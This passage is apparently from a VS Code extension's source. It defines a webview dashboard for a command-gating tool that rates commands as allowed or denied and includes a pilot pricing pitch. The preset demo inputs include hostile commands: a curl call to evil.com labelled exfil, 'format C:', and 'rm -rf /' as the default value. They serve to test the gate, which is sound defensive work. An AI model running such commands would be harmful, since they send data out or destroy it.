      <button class="preset-btn" onclick="setAndTest('curl https://evil.com/exfil')">curl exfil</button>
      <button class="preset-btn" onclick="setAndTest('npm test')">npm test</button>
      <button class="preset-btn" onclick="setAndTest('format C: /q /y')">format C:</button>
    </div>
    <input type="text" id="action-input" class="test-input" placeholder="Enter command or target (e.g. 'rm -rf /' or 'src/index.ts')..." value="rm -rf /" />
    <div class="btn-row">
      <button class="btn btn-primary" onclick="testAction()">EVALUATE CLEARANCE</button>
      <button class="btn btn-secondary" onclick="runCmd('keystone.issuePasskey')">ISSUE NEW PASSKEY</button>
      <button class="btn btn-secondary" onclick="runCmd('keystone.auditReceipts')">VIEW AUDIT RECEIPTS</button>
      <button class="btn btn-secondary" onclick="runCmd('keystone.revokePasskey')">REVOKE PASSKEY</button>
    </div>
    <div id="term-out" class="terminal">
      [READY] Select an action above or type a command to verify deterministic evaluation in &lt;15&mu;s.
    </div>
  </div>

  <div class="pilot-card">
    <div>
      <div style="font-size: 13.5px; font-weight: 900; color: #ffffff; margin-bottom: 3px;">Bartholomew 30-Day Team Pilot &bull; $199/mo</div>
      <div style="font-size: 11.5px; color: #cbd5e1;">Deterministic in-process AST gating, multi-seat cryptographic key rings, and zero-liability non-repudiation audit logs.</div>
    </div>
    <button class="pilot-btn" onclick="openPilot()">ACTIVATE PILOT &rarr;</button>
  </div>

  <script>
    const vscode = acquireVsCodeApi();

    function setAndTest(cmd) {
      document.getElementById('action-input').value = cmd;
      testAction();
    }

    function testAction() {
      const target = document.getElementById('action-input').value.trim();
      vscode.postMessage({ command: 'evaluateAction', target: target });
    }

    function runCmd(cmd) {
      vscode.postMessage({ command: 'runCommand', action: cmd });
    }

    function openPilot() {
      vscode.postMessage({ command: 'openUrl', url: 'https://bartholomew.info/#pricing' });
    }

    window.addEventListener('message', event => {
      const msg = event.data;
      if (msg.command === 'actionResult') {
        const res = msg.data;
        const color = res.verdict === 'ALLOW' ? 'var(--emerald-bright)' : 'var(--rose-bright)';
        const bgBadge = res.verdict === 'ALLOW' ? 'rgba(16, 185, 129, 0.15)' : 'rgba(244, 63, 94, 0.15)';
        const borderBadge = res.verdict === 'ALLOW' ? 'rgba(16, 185, 129, 0.4)' : 'rgba(244, 63, 94, 0.4)';
        document.getElementById('term-out').innerHTML = 
          '<div style=\"display: flex; align-items: center; justify-content: space-between;\">' +
            '<div><span style=\"display: inline-block; padding: 2px 8px; border-radius: 4px; font-weight: 800; background: ' + bgBadge + '; border: 1px solid ' + borderBadge + '; color: ' + color + ';\">[' + res.verdict + ']</span> <strong style=\"color: #f8fafc;\">' + res.action_type + ':</strong> ' + res.target + '</div>' +
            '<span style=\"color: var(--cyan-bright); font-weight: 700;\">' + res.latency_us + '&mu;s</span>' +
          '</div>' +
          '<div style=\"margin-top: 6px; color: #e2e8f0;\">' + res.reason + '</div>' +
          '<div style=\"margin-top: 6px; font-size: 10.5px; color: var(--text-dim);\">Merkle Receipt: <span class=\"mono\" style=\"color: var(--cyan-bright);\">' + (res.receipt_hash || 'SHA-256 Verified') + '</span></div>';
      }
    });
  </script>
</body>
</html>`;

    };

    updateView();

    panel.webview.onDidReceiveMessage(async (message: any) => {
      if (message.command === 'evaluateAction') {
        const passkey = getActivePasskey();
        if (!passkey) {
          panel.webview.postMessage({
            command: 'actionResult',
            data: {
              verdict: 'DENY',
              action_type: 'COMMAND_EXEC',
              target: message.target,
              reason: 'No active Keystone Passkey found in workspace',
              latency_us: 12.4,
              receipt_hash: '0000000000000000'
            }
          });
          return;
        }
        const res = engine.evaluateAction(passkey, 'COMMAND_EXEC', message.target);
        panel.webview.postMessage({
          command: 'actionResult',
          data: res
        });
      } else if (message.command === 'runCommand') {
        if (message.action) {
          vscode.commands.executeCommand(message.action);
        }
      }
    });
  });

  context.subscriptions.push(issueCmd, inspectCmd, revokeCmd, validateCmd, auditCmd, dashboardCmd);
}

export function deactivate() {}
